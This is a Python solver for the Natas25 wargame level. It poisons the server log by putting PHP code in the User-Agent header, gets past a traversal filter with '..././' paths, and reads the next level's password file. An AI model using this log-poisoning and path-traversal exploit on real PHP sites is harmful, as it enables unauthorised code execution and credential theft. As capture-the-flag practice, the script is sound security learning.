#/usr/bin/python3
'''
Natas25 Solver.
This time we have to do bypass some directory traversal filters,
and also hijack some PHP code again.
'''
#have to import regex so that I can get just the password.
import re
#my auth module and such.
import natas
#have to have requests.
import requests
username='natas25'
password='GHF6X7YwACaYYssHVY05cFq83hRktl4c'
#create our credentials.
login,url=natas.create_auth(username,password)
session=requests.session()
session.auth=login
#send the url.
r=session.get(url,allow_redirects=False)
'''
Here we're setting the useragent to our exploit code as they're just letting you do it. This information will then be put into the log file.
Then all we have to do is read this file. We'll also have to get around the stripper but it's only doing the _first_ instance of it each time so we just have to add extra ones to it when we do our second request.
'''
headers={'User-Agent':'<?php include "/etc/natas_webpass/natas26" ?>'}
session.get(url+'&lang=../etc/natas_webpass/natas26',headers=headers)
#now we'll read the log file.
#to get around it do go up by one directory you have to change.
# ../ => ..././ which after filtering will become ../ again because it deletes
#the ../ from it not the resulting one.
sessid=session.cookies.get_dict()['PHPSESSID']
#make sure that we get our URL otu of it by looking at the file.
url=url+'&lang=..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_'+sessid+'.log';
#do our request.
r=session.get(url,headers=headers)

#this will make sure we get _just_ the password from our log file.
pattern=re.compile('(?<=\[\d{2}.\d{2}.\d{4}\ \d{2}:\:\d{2}\:\d{2}\]\ )(.*.)(?=\n \")',flags=re.M)
#print that string.
#contents=r.content.decode('UTF-8')
print(pattern.findall(r.content.decode('UTF-8'))[0])

